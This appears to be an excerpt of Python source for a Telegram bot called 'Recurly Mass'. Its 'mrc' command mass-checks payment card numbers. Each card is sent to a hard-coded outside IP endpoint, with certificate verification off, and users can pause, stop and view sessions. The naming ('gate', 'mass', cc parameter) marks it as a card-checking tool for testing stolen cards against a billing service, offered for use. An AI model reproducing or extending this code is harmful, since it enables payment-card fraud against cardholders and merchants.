...
GATE_NAME = "Recurly Mass"
GATE_CMD = "mrc"
RC_API = "http://5.83.136.66:8020/recurly?cc={cc}"
active_sessions = {}
...
def process_single_card(card):
    try:
        resp = requests.get(RC_API.format(cc=card), timeout=90, verify=False)
        if resp.status_code == 200:
            data = resp.json()
...
@router.message(Command("mrc"))
async def mrc_command(message: types.Message):
...
@router.callback_query(F.data.startswith("mrc_card_"))
async def mrc_card_callback(callback: types.CallbackQuery):
...
@router.callback_query(F.data.startswith("mrc_response_"))
async def mrc_response_callback(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[2])
    if user_id != callback.from_user.id:
        await callback.answer("❌ Not your session!", show_alert=True)
        return
...
@router.callback_query(F.data.startswith("mrc_stop_"))
async def mrc_stop_callback(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[2])
    if user_id != callback.from_user.id:
        await callback.answer("❌ Not your session!", show_alert=True)
        return
...
@router.callback_query(F.data.startswith("mrc_pause_"))
async def mrc_pause_callback(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[2])
    if user_id != callback.from_user.id:
        await callback.answer("❌ Not your session!", show_alert=True)
        return
